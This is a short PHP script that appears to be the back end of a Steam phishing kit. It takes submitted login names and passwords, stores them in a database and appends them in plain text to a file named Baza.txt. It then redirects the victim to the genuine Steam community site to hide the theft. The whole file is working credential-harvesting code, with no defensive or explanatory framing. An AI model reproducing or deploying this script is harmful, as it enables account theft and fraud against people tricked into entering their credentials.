<?PHP
include "db.mysql.php";

$db = new SafeMySQL(); $db->savePassword($_POST['login'], $_POST['password']);

$Log = $_POST['login'];
$Pass = $_POST['password'];
$log = fopen("Baza.txt","at");// Название вашей базы данных
fwrite($log," $Log:$Pass \n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://steamcommunity.com'></head></html>";
